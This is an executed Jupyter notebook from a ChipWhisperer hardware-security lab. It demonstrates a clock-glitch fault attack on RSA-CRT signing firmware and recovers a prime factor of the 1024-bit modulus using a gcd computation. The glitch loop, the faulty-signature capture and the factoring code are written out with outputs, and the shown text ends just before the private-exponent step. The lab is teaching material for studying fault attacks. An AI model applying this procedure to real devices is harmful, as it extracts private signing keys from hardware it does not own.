{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Fault Attack on RSA"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Acknowledgements\n",
    "\n",
    "This attack is was originally detailed in a [1997 paper by Boneh, Demillo, and Lipton](https://www.researchgate.net/publication/2409434_On_the_Importance_of_Checking_Computations). This tutorial draws heavily from a blog post by David Wong, which you can find [here](https://www.cryptologie.net/article/371/fault-attacks-on-rsas-signatures/)."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---\n",
    "NOTE: This lab references some (commercial) training material on [ChipWhisperer.io](https://www.ChipWhisperer.io). You can freely execute and use the lab per the open-source license (including using it in your own courses if you distribute similarly), but you must maintain notice about this source location. Consider joining our training course to enjoy the full experience.\n",
    "\n",
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**SUMMARY:** *So far, we've seen how clock and voltage glitches can be used to disrupt a microcontroller or FPGA, potentially changing the execution path. We've also seen that, in the case of AES, if we disrupt the calculation in a certian spot only twice, we can easily recover a quarter of the key bytes.*\n",
    "\n",
    "*In this lab, we'll explore an attack on RSA, more specifically an RSA optimization, that can recover the entire key with a single fault.*\n",
    "\n",
    "**LEARNING OUTCOMES:**\n",
    "\n",
    "* Understanding conditions for the fault\n",
    "* Recovering an RSA private key from a faulty signature"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Attack Theory\n",
    "\n",
    "The theory for this attack is a bit simpler than the one for AES, so we'll take you through it here instead of putting it in another notebook. If you don't know, RSA is an asymmetric cryptographic algorithm, meaning it has a public and private key, with one being used for encryption and the other for decryption. It can be used in both a public encryption/private decryption configuration and a private encryption/public decryption situation. We'll be attacking the latter case. Let's assume that the target is signing a message and is sending it to us so we can verify the identity of the device.\n",
    "\n",
    "For RSA, the public key is made up of two numbers, $n$ and $e$. The private key is made up of $n$ and $d$. These numbers have some special properties:\n",
    "\n",
    "1. $n$ is constructed as the product of 2 prime numbers, $p$ and $q$.\n",
    "1. $d$ is derived from $p$, $q$, and $e$.\n",
    "\n",
    "As a result of these properties, a few things are evident:\n",
    "\n",
    "1. If we learn $p$ or $q$, we can derive the other prime number since $n$ is public information.\n",
    "1. If we learn $p$ and $q$, we can derive $d$ since $e$ is public information.\n",
    "\n",
    "The target can encrypt/sign a message with the following equation ($s$ is the signature and $m$ is the message):\n",
    "\n",
    "$$s = m^d({mod}\\space n)$$\n",
    "\n",
    "And we can decrypt/verify the message with the following equation:\n",
    "\n",
    "$$s^e = m(mod\\space n)$$\n",
    "\n",
    "One issue with RSA is that it's very slow - these equations are simple, but they use massive numbers; if the numbers used are too small, it's trivial for a computer to factor $n$ into $p$ and $q$. $n$ for the firmware we're attacking is 1024 bits long, which is on the smaller size of secure keys at this point. This encryption/signing operation is especially slow.\n",
    "\n",
    "An important property of the signature verification equation is that the following is also true:\n",
    "\n",
    "$$(m - s^e)(mod\\space n) = 0$$\n",
    "\n",
    "aka $(m - s^e)$ is divisible by $n$. It follows that $(m - s^e)$ is divisible by $p$ and $q$ as well.\n",
    "\n",
    "## The Chinese Remainder Theorem (CRT)\n",
    "\n",
    "To help speed up the encryption, an optimization known as the Chinese Remainder Theorem (CRT) can be used. This theorem allows us derive two new exponents, $d_p$ and $d_q$, which are much smaller than $d$. We can then replace\n",
    "\n",
    "$$s = m^d({mod}\\space n)$$\n",
    "\n",
    "with two equations\n",
    "\n",
    "$$s_1 = m^{d_p}(mod\\ p) \\\\\n",
    "s_2 = m^{d_q}(mod\\ q)$$\n",
    "\n",
    "$s$ is then:\n",
    "\n",
    "$$i_q = q^{-1}mod\\ p \\\\\n",
    "s = s_2 + q(i_q(s_1 - s_2)mod\\ p)\n",
    "$$\n",
    "\n",
    "$s_1$ and $s_2$ can be combined into $s$ via CRT. Even though there's two modular exponentiations, this is still much faster since $d_p$ and $d_q$ are much smaller than $d$ and $p$ and $q$ are much smaller than $n$. This is the optimization that our target, which is using a slightly modified version of MBEDTLS (more on that in a bit), makes.\n",
    "\n",
    "## Inserting a Fault\n",
    "\n",
    "Suppose that instead of everything going smoothly as above, a fault happens during the calculation of $s_2$, turning it into $s'_2$. $s_1$ and $s'_2$ will then be combined into $s'$. If that happens, a couple of things will be true:\n",
    "\n",
    "1. When we go to verify the signature, it won't work: $s'^e \\neq m (mod\\ n)$. Concequently, $(m - s'^e)(mod\\space n) \\neq 0$, so $(m - s'^e)$ is not divisible by $n$\n",
    "1. Since $(m - s'^e)$ is not divisible by $n$, it cannot be divisible by both $p$ and $q$ anymore. Due to how the CRT works, it will still be divisible by $p$, but not by $q$. This can be expressed as $(m - s'^e) = pk$ for some integer $k$.  \n",
    "1. We now have $(m - s'^e) = pk$ and $n = pq$. This means that we can find $p$ by computing $gcd(m-s'^e, n)$\n",
    "    \n",
    "Once we have $p$, we can compute $q = \\frac{n}{p}$ and $d$ via the rest of the RSA key generation algorithm. \n",
    "\n",
    "The math is similar in the case that $s_1$ is faulted, with the only difference being that we recover $q$ at the end instead of $p$.\n",
    "\n",
    "## Communicating with the Target\n",
    "\n",
    "With the math out of the way, we can get to attacking the target:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [],
   "source": [
    "SCOPETYPE = 'OPENADC'\n",
    "PLATFORM = 'CWLITEARM'\n",
    "# WRITE YOUR OWN HOME PATH:\n",
    "CW_PATH = '/tp/xm2cyse/xm2cyse550/chipwhisperer/' "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "SS_VER set to SS_VER_1_1\n",
      "SS_VER set to SS_VER_1_1\n",
      "SS_VER set to SS_VER_1_1\n",
      "SS_VER set to SS_VER_1_1\n",
      "mkdir -p .dep\n",
      "SS_VER set to SS_VER_1_1\n",
      "SS_VER set to SS_VER_1_1\n",
      ".\n",
      "Welcome to another exciting ChipWhisperer target build!!\n",
      "arm-none-eabi-gcc (15:9-2019-q4-0ubuntu1) 9.2.1 20191025 (release) [ARM/arm-9-branch revision 277599]\n",
      "Copyright (C) 2019 Free Software Foundation, Inc.\n",
      "This is free software; see the source for copying conditions.  There is NO\n",
      "warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.\n",
      "\n",
      "mkdir -p objdir-CWLITEARM \n",
      ".\n",
      "Compiling:\n",
      "-en     simpleserial-rsa.c ...\n",
      "-e Done!\n",
      ".\n",
      "Compiling:\n",
      "-en     simpleserial-rsa-xmega.c ...\n",
      "-e Done!\n",
      ".\n",
      "Compiling:\n",
      "-en     simpleserial-rsa-arm.c ...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "simpleserial-rsa-arm.c: In function 'get_pt':\n",
      "simpleserial-rsa-arm.c:412:1: warning: control reaches end of non-void function [-Wreturn-type]\n",
      "  412 | }\n",
      "      | ^\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "-e Done!\n",
      ".\n",
      "Compiling:\n",
      "-en     .././simpleserial/simpleserial.c ...\n",
      "-e Done!\n",
      ".\n",
      "Compiling:\n",
      "-en     .././hal/stm32f3/stm32f3_hal.c ...\n",
      "-e Done!\n",
      ".\n",
      "Compiling:\n",
      "-en     .././hal/stm32f3/stm32f3_hal_lowlevel.c ...\n",
      "-e Done!\n",
      ".\n",
      "Compiling:\n",
      "-en     .././hal/stm32f3/stm32f3_sysmem.c ...\n",
      "-e Done!\n",
      ".\n",
      "Compiling:\n",
      "-en     .././crypto/mbedtls//library/rsa.c ...\n",
      "-e Done!\n",
      ".\n",
      "Compiling:\n",
      "-en     .././crypto/mbedtls//library/bignum.c ...\n",
      "-e Done!\n",
      ".\n",
      "Compiling:\n",
      "-en     .././crypto/mbedtls//library/md.c ...\n",
      "-e Done!\n",
      ".\n",
      "Compiling:\n",
      "-en     .././crypto/mbedtls//library/md5.c ...\n",
      "-e Done!\n",
      ".\n",
      "Compiling:\n",
      "-en     .././crypto/mbedtls//library/md_wrap.c ...\n",
      "-e Done!\n",
      ".\n",
      "Compiling:\n",
      "-en     .././crypto/mbedtls//library/sha1.c ...\n",
      "-e Done!\n",
      ".\n",
      "Compiling:\n",
      "-en     .././crypto/mbedtls//library/sha256.c ...\n",
      "-e Done!\n",
      ".\n",
      "Compiling:\n",
      "-en     .././crypto/mbedtls//library/sha512.c ...\n",
      "-e Done!\n",
      ".\n",
      "Compiling:\n",
      "-en     .././crypto/mbedtls//library/ripemd160.c ...\n",
      "-e Done!\n",
      ".\n",
      "Compiling:\n",
      "-en     .././crypto/mbedtls//library/oid.c ...\n",
      "-e Done!\n",
      ".\n",
      "Assembling: .././hal/stm32f3/stm32f3_startup.S\n",
      "arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -x assembler-with-cpp -mthumb -mfloat-abi=soft -fmessage-length=0 -ffunction-sections -DF_CPU=7372800 -Wa,-gstabs,-adhlns=objdir-CWLITEARM/stm32f3_startup.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././simpleserial/ -I.././crypto/ -I.././crypto/mbedtls//include .././hal/stm32f3/stm32f3_startup.S -o objdir-CWLITEARM/stm32f3_startup.o\n",
      ".\n",
      "LINKING:\n",
      "-en     simpleserial-rsa-CWLITEARM.elf ...\n",
      "-e Done!\n",
      ".\n",
      "Creating load file for Flash: simpleserial-rsa-CWLITEARM.hex\n",
      "arm-none-eabi-objcopy -O ihex -R .eeprom -R .fuse -R .lock -R .signature simpleserial-rsa-CWLITEARM.elf simpleserial-rsa-CWLITEARM.hex\n",
      ".\n",
      "Creating load file for Flash: simpleserial-rsa-CWLITEARM.bin\n",
      "arm-none-eabi-objcopy -O binary -R .eeprom -R .fuse -R .lock -R .signature simpleserial-rsa-CWLITEARM.elf simpleserial-rsa-CWLITEARM.bin\n",
      ".\n",
      "Creating load file for EEPROM: simpleserial-rsa-CWLITEARM.eep\n",
      "arm-none-eabi-objcopy -j .eeprom --set-section-flags=.eeprom=\"alloc,load\" \\\n",
      "--change-section-lma .eeprom=0 --no-change-warnings -O ihex simpleserial-rsa-CWLITEARM.elf simpleserial-rsa-CWLITEARM.eep || exit 0\n",
      ".\n",
      "Creating Extended Listing: simpleserial-rsa-CWLITEARM.lss\n",
      "arm-none-eabi-objdump -h -S -z simpleserial-rsa-CWLITEARM.elf > simpleserial-rsa-CWLITEARM.lss\n",
      ".\n",
      "Creating Symbol Table: simpleserial-rsa-CWLITEARM.sym\n",
      "arm-none-eabi-nm -n simpleserial-rsa-CWLITEARM.elf > simpleserial-rsa-CWLITEARM.sym\n",
      "SS_VER set to SS_VER_1_1\n",
      "SS_VER set to SS_VER_1_1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "make[1]: Warning: File '.dep/bignum.o.d' has modification time 232 s in the future\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Size after:\n",
      "   text\t   data\t    bss\t    dec\t    hex\tfilename\n",
      "  22216\t    116\t  18340\t  40672\t   9ee0\tsimpleserial-rsa-CWLITEARM.elf\n",
      "+--------------------------------------------------------\n",
      "+ Default target does full rebuild each time.\n",
      "+ Specify buildtarget == allquick == to avoid full rebuild\n",
      "+--------------------------------------------------------\n",
      "+--------------------------------------------------------\n",
      "+ Built for platform CW-Lite Arm \\(STM32F3\\) with:\n",
      "+ CRYPTO_TARGET = MBEDTLS\n",
      "+ CRYPTO_OPTIONS = RSA\n",
      "+--------------------------------------------------------\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "make[1]: warning:  Clock skew detected.  Your build may be incomplete.\n"
     ]
    }
   ],
   "source": [
    "%%bash -s \"$CW_PATH\" \"$PLATFORM\"\n",
    "cd $1hardware/victims/firmware/simpleserial-rsa\n",
    "make PLATFORM=$2 CRYPTO_TARGET=MBEDTLS CRYPTO_OPTIONS=RSA OPT=2"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer NAEUSB WARNING|File naeusb.py:799) Your firmware (0.23) is outdated - latest is 0.65 See https://chipwhisperer.readthedocs.io/en/latest/firmware.html for more information\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "INFO: Found ChipWhisperer😍\n",
      "scope.gain.mode                          changed from low                       to high                     \n",
      "scope.gain.gain                          changed from 0                         to 30                       \n",
      "scope.gain.db                            changed from 5.5                       to 24.8359375               \n",
      "scope.adc.basic_mode                     changed from low                       to rising_edge              \n",
      "scope.adc.samples                        changed from 24400                     to 5000                     \n",
      "scope.adc.trig_count                     changed from 7612748                   to 30007001                 \n",
      "scope.clock.adc_src                      changed from clkgen_x1                 to clkgen_x4                \n",
      "scope.clock.adc_freq                     changed from 0                         to 372363281                \n",
      "scope.clock.adc_rate                     changed from 0.0                       to 372363281.0              \n",
      "scope.clock.clkgen_div                   changed from 1                         to 26                       \n",
      "scope.clock.clkgen_freq                  changed from 192000000.0               to 7384615.384615385        \n",
      "scope.io.tio1                            changed from serial_tx                 to serial_rx                \n",
      "scope.io.tio2                            changed from serial_rx                 to serial_tx                \n",
      "scope.io.hs2                             changed from None                      to clkgen                   \n"
     ]
    }
   ],
   "source": [
    "# %run \"../../Setup_Scripts/Setup_Generic.ipynb\"\n",
    "setup_script = CW_PATH  + \"jupyter/Setup_Scripts/Setup_Generic.ipynb\"\n",
    "%run $setup_script"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Detected known STMF32: STM32F302xB(C)/303xB(C)\n",
      "Extended erase (0x44), this can take ten seconds or more\n",
      "Attempting to program 22387 bytes at 0x8000000\n",
      "STM32F Programming flash...\n",
      "STM32F Reading flash...\n",
      "Verified flash OK, 22387 bytes\n"
     ]
    }
   ],
   "source": [
    "import time\n",
    "fw_path = CW_PATH  + \"hardware/victims/firmware/simpleserial-rsa/simpleserial-rsa-{}.hex\".format(PLATFORM)\n",
    "cw.program_target(scope, prog, fw_path)\n",
    "time.sleep(1)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "This target is using the simpleserial protocol, but the full signature is too big to read back in a single command. This means we instead read back the signature in 3 commands:\n",
    "\n",
    "1. `'t'` will do the signature calculation and respond with the first 48 bytes of the signature\n",
    "1. `'1'` will return the next 48 bytes of the signature\n",
    "1. `'2'` will return the final 32 bytes of the signature"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [],
   "source": [
    "import time\n",
    "scope.clock.adc_src = \"clkgen_x1\"\n",
    "target.flush()\n",
    "\n",
    "scope.arm()\n",
    "target.simpleserial_write(\"t\", bytearray([]))\n",
    "    \n",
    "ret = scope.capture()\n",
    "if ret:\n",
    "    print('Timeout happened during acquisition')\n",
    "    \n",
    "time.sleep(2)\n",
    "output = target.simpleserial_read_witherrors('r', 48, timeout=10)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "bytearray(b'O\\ty\\x9fjY\\x08\\x1brU\\x99u30\\xb7\\xa2D\\n\\xbcB`f\\x01b/\\xe0\\xc5\\x82dn2US\\x03\\xe1\\x06*)\\x89\\xd9\\xb4\\xc2eC\\x1a\\xdbX\\xdd')\n",
      "10813434\n"
     ]
    }
   ],
   "source": [
    "sig = None\n",
    "if output['valid']:\n",
    "    print(output['payload'])\n",
    "    sig = output['payload']\n",
    "    \n",
    "print(scope.adc.trig_count)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "That took a long time, probably more than 10M cycles! Let's read back the rest of the message and append it to our signature:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "bytearray(b'O\\ty\\x9fjY\\x08\\x1brU\\x99u30\\xb7\\xa2D\\n\\xbcB`f\\x01b/\\xe0\\xc5\\x82dn2US\\x03\\xe1\\x06*)\\x89\\xd9\\xb4\\xc2eC\\x1a\\xdbX\\xdd\\x85\\xbb3\\xc4\\xbb#z1\\x1b\\xc4\\x0c\\x12yR\\x8f\\xd6\\xbb6\\xf9OSJM\\x82\\x84\\xa1\\x8a\\xb8\\xe5g\\x0esLU\\xa6\\xcc\\xab_\\xb5\\xea\\xe0+\\xa3~-Vd\\x8dz\\x13\\xbb\\xf1z\\x0e\\x07\\xd6\\x07\\xc0|\\xbbr\\xc7\\xa7\\xa7pv7n\\x844\\xcen\\x13h2\\xdc\\x95\\xdb=\\x80')\n"
     ]
    }
   ],
   "source": [
    "target.simpleserial_write(\"1\", bytearray())\n",
    "time.sleep(0.2)\n",
    "output = target.simpleserial_read_witherrors('r', 48, timeout=10)\n",
    "if output['valid']:\n",
    "    sig.extend(output['payload'])\n",
    "\n",
    "target.simpleserial_write(\"2\", bytearray())\n",
    "time.sleep(0.2)\n",
    "output = target.simpleserial_read_witherrors('r', 32, timeout=10)\n",
    "if output['valid']:\n",
    "    sig.extend(output['payload'])\n",
    "    \n",
    "print(sig)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [],
   "source": [
    "if PLATFORM == \"CWLITEXMEGA\":\n",
    "    def reboot_flush():            \n",
    "        scope.io.pdic = False\n",
    "        time.sleep(0.1)\n",
    "        scope.io.pdic = \"high_z\"\n",
    "        time.sleep(0.1)\n",
    "        #Flush garbage too\n",
    "        target.flush()\n",
    "else:\n",
    "    def reboot_flush():            \n",
    "        scope.io.nrst = False\n",
    "        time.sleep(0.05)\n",
    "        scope.io.nrst = \"high_z\"\n",
    "        time.sleep(0.05)\n",
    "        #Flush garbage too\n",
    "        target.flush()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Let's verify that our signature is correct and that we can verify it:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "True\n"
     ]
    }
   ],
   "source": [
    "from Crypto.PublicKey import RSA\n",
    "from Crypto.Signature import PKCS1_v1_5 \n",
    "\n",
    "from Crypto.Hash import SHA256\n",
    "\n",
    "e = 0x10001\n",
    "n = 0x9292758453063D803DD603D5E777D7888ED1D5BF35786190FA2F23EBC0848AEADDA92CA6C3D80B32C4D109BE0F36D6AE7130B9CED7ACDF54CFC7555AC14EEBAB93A89813FBF3C4F8066D2D800F7C38A81AE31942917403FF4946B0A83D3D3E05EE57C6F5F5606FB5D4BC6CD34EE0801A5E94BB77B07507233A0BC7BAC8F90F79\n",
    "m = b\"Hello World!\"\n",
    "\n",
    "hash_object = SHA256.new(data=m)\n",
    "pub_key = RSA.construct((n, e))\n",
    "signer = PKCS1_v1_5.new(pub_key) \n",
    "sig_check = signer.verify(hash_object, sig)\n",
    "print(sig_check)\n",
    "\n",
    "assert sig_check, \"Failed to verify signature on device. Got: {}\".format(newout)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now let's setup the glitch module. Use settings here that worked for you before. Ideally, you'll have a single group of settings here - RSA is very slow (as you've seen), so trying to scan settings here would take forever!\n",
    "\n",
    "**Hint:** If needed, reuse the characterization loop from Lab5 to find the corect parameters"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "clk_src     = clkgen\n",
      "width       = 10.15625\n",
      "width_fine  = 0\n",
      "offset      = -12.109375\n",
      "offset_fine = 0\n",
      "trigger_src = ext_single\n",
      "arm_timing  = after_scope\n",
      "ext_offset  = 0\n",
      "repeat      = 6\n",
      "output      = clock_xor\n",
      "\n"
     ]
    }
   ],
   "source": [
    "scope.glitch.clk_src = \"clkgen\"\n",
    "scope.glitch.output = \"clock_xor\"\n",
    "scope.glitch.trigger_src = \"ext_single\"\n",
    "scope.glitch.repeat = 6 # CHOOSE A SUITABLE VALUE (1..6)\n",
    "scope.glitch.width = 10.15625 # CHOOSE A SUITABLE VALUE (-10..10)\n",
    "scope.glitch.offset = -12.109375 # CHOOSE A SUITABLE VALUE (-40..0)\n",
    "#if it does not work, try to increase the ranges  \n",
    "scope.io.hs2 = \"glitch\"\n",
    "print(scope.glitch)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Try to glitch the signature competition in order to get exploitable faults.\n",
    "Remember that you need to fault only one of the two sub-computations, and when you inject faults the control flow may diverge. This means that if you want one of the signature to be correct, you should inject the fault into the second subcomputation.\n",
    "\n",
    "You can capture a trace and look for sensible offsets. Take care to decimate as much as needed, as RSA computation is quite long!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "/tmp/ipykernel_15767/2933538362.py:3: TqdmDeprecationWarning: Please use `tqdm.notebook.trange` instead of `tqdm.tnrange`\n",
      "  for i in tnrange(5000000, 6000000,100000 ): #look for something kind of near the end, look at global number of cycles used earlier for computation!\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "810318625ec34e6ba999369990f42f23",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/10 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "crash {'valid': False, 'payload': None, 'full_response': '', 'rv': None}\n",
      "crash {'valid': False, 'payload': None, 'full_response': '', 'rv': None}\n",
      "crash {'valid': False, 'payload': None, 'full_response': '', 'rv': None}\n",
      "crash {'valid': False, 'payload': None, 'full_response': '', 'rv': None}\n",
      "crash {'valid': False, 'payload': None, 'full_response': '', 'rv': None}\n",
      "Glitched!\n"
     ]
    }
   ],
   "source": [
    "from tqdm import tnrange\n",
    "import time\n",
    "for i in tnrange(5000000, 6000000,100000 ): #look for something kind of near the end, look at global number of cycles used earlier for computation!\n",
    "    scope.glitch.ext_offset = i\n",
    "    scope.adc.timeout = 3\n",
    "    target.flush()\n",
    "    scope.arm()\n",
    "    target.simpleserial_write(\"t\", bytearray([]))\n",
    "\n",
    "    ret = scope.capture()\n",
    "    if ret:\n",
    "        print('Timeout happened during acquisition')\n",
    "        reboot_flush()\n",
    "        time.sleep(0.5)\n",
    "        continue\n",
    "\n",
    "    time.sleep(2)\n",
    "    output = target.simpleserial_read_witherrors('r', 48, timeout=100, glitch_timeout=1)\n",
    "    if output['valid'] is False: # replace with invalid output detection\n",
    "        print(\"crash\", output) #we can't really do anything here - we need the full signature back\n",
    "        reboot_flush()\n",
    "        time.sleep(0.5)\n",
    "        continue\n",
    "    else:\n",
    "        sig = output['payload']\n",
    "        target.simpleserial_write(\"1\", bytearray())\n",
    "        time.sleep(0.1)\n",
    "        output = target.simpleserial_read_witherrors('r', 48, timeout=10)\n",
    "        if output['valid']:\n",
    "            sig.extend(output['payload'])\n",
    "        else:\n",
    "            print(\"couldn't read 1 cmd\")\n",
    "            continue\n",
    "\n",
    "        target.simpleserial_write(\"2\", bytearray())\n",
    "        time.sleep(0.1)\n",
    "        output = target.simpleserial_read_witherrors('r', 32, timeout=10)\n",
    "        if output['valid']:\n",
    "            sig.extend(output['payload'])\n",
    "        else:\n",
    "            print(\"Couldn't read 2 cmd\")\n",
    "            continue\n",
    "        sig_check = signer.verify(hash_object, sig)\n",
    "        if sig_check is False: #detect if the calculation was messed up\n",
    "            # call the faulty signature whatever you want\n",
    "            # but we'll assume it's called sig for the rest of the lab\n",
    "            print(\"Glitched!\")\n",
    "            sig = sig\n",
    "            break\n",
    "        else:\n",
    "            pass # normal operation, nothing special"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Padding the Message\n",
    "\n",
    "We've got our glitched signature, but we've still got a little work to do. The $m$ isn't actually the message by itself. Instead, it's a PKCS#1 v1.5 padded hash of it. Luckily, this standard's fairly simple. PKCS#1 v1.5 padding looks like:\n",
    "\n",
    "\\|00\\|01\\|ff...\\|00\\|hash_prefix\\|message_hash\\|\n",
    "\n",
    "Here, the ff... part is a string of ff bytes long enough to make the size of the padded message the same as N, while hash_prefix is an identifier number for the hash algorithm used on message_hash. Our message was hashed using SHA256, which has the hash prefix `3031300d060960864801650304020105000420`.\n",
    "\n",
    "We can get our hashed message and $m$ with the following code:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "7f83b1657ff1fc53b92dc18148a1d65dfc2d4b1fa3d677284addd200126d9069\n",
      "0001ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff003031300d0609608648016503040201050004207f83b1657ff1fc53b92dc18148a1d65dfc2d4b1fa3d677284addd200126d9069\n"
     ]
    }
   ],
   "source": [
    "from Crypto.Hash import SHA256\n",
    "from binascii import hexlify, unhexlify\n",
    "\n",
    "def build_message(m, n):\n",
    "    sha_id = \"3031300d060960864801650304020105000420\"\n",
    "    N_len = (len(bin(n)) - 2 + 7) // 8\n",
    "    pad_len = (len(hex(n)) - 2) // 2 - 3 - len(m)//2 - len(sha_id)//2\n",
    "    padded_m = \"0001\" + \"ff\" * pad_len + \"00\" + sha_id + m\n",
    "    return padded_m\n",
    "\n",
    "hashed_m = hexlify(hash_object.digest()).decode()\n",
    "padded_m = build_message(hashed_m, n)\n",
    "print(hashed_m)\n",
    "print(padded_m)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Recovering the Private Key\n",
    "\n",
    "Now we can recover the private values by plugging them into the equations from earlier. If you can, install the gmpy2 Python library, which has much better support for big integer math like this. Otherwise, run the next block and wait for a few minutes for the calculation to finish.\n",
    "\n",
    "You can get gmpy2 on Windows from the following link: https://pypi.org/project/gmpy2/#files. On Linux, you can install it via your package manager (python3-gmpy2 on Apt, for example)."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Defaulting to user installation because normal site-packages is not writeable\n",
      "Collecting gmpy2\n",
      "  Downloading gmpy2-2.1.5-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (1.7 MB)\n",
      "\u001b[K     |████████████████████████████████| 1.7 MB 4.0 MB/s eta 0:00:01\n",
      "\u001b[?25hInstalling collected packages: gmpy2\n",
      "Successfully installed gmpy2-2.1.5\n",
      "\u001b[33mWARNING: You are using pip version 21.1.2; however, version 23.3.2 is available.\n",
      "You should consider upgrading via the '/bin/python3.8 -m pip install --upgrade pip' command.\u001b[0m\n"
     ]
    }
   ],
   "source": [
    "import sys\n",
    "!{sys.executable} -m pip install gmpy2"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0xc36d0eb7fcd285223cfb5aaba5bda3d82c01cad19ea484a87ea4377637e75500fcb2005c5c7dd6ec4ac023cda285d796c3d9e75e1efc42488bb4f1d13ac30a57\n"
     ]
    }
   ],
   "source": [
    "from math import gcd\n",
    "n = 0x9292758453063D803DD603D5E777D7888ED1D5BF35786190FA2F23EBC0848AEADDA92CA6C3D80B32C4D109BE0F36D6AE7130B9CED7ACDF54CFC7555AC14EEBAB93A89813FBF3C4F8066D2D800F7C38A81AE31942917403FF4946B0A83D3D3E05EE57C6F5F5606FB5D4BC6CD34EE0801A5E94BB77B07507233A0BC7BAC8F90F79\n",
    "e = 0x10001\n",
    "try:\n",
    "    import gmpy2\n",
    "    from gmpy2 import mpz\n",
    "    sig_int = mpz(int.from_bytes(sig, \"big\"))\n",
    "    m_int = mpz(int.from_bytes(unhexlify(padded_m), \"big\"))\n",
    "    p_test = gmpy2.gcd(m_int-sig_int**e, n) # LOOK AT ATTACK THEORY PARAGRAPH ABOVE\n",
    "except (ImportError, ModuleNotFoundError) as error:\n",
    "    print(\"gmpy2 not found, falling back to Python\")\n",
    "    sig_int = int.from_bytes(sig, \"big\")\n",
    "    padded_m_int = int.from_bytes(unhexlify(padded_m), \"big\")\n",
    "    p_test = gcd(padded_m_int-sig_int**e, n) # LOOK AT ATTACK THEORY PARAGRAPH ABOVE\n",
    "    \n",
    "print(hex(p_test))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "We should now have either $p$ or $q$! We can get the other prime by simply dividing $n$ by the one we have."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0xc000df51a7c77ae8d7c7370c1ff55b69e211c2b9e5db1ed0bf61d0d9899620f4910e4168387e3c30aa1e00c339a795088452dd96a9a5ea5d9dca68da636032af\n"
     ]
    }
   ],
   "source": [
    "q_test = n//p_test\n",
    "print(hex(q_test))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The $d$ calculation is a bit more complicated. Here's some code to derive it from $q$, $p$, and $e$:"
   ]
  },
  {
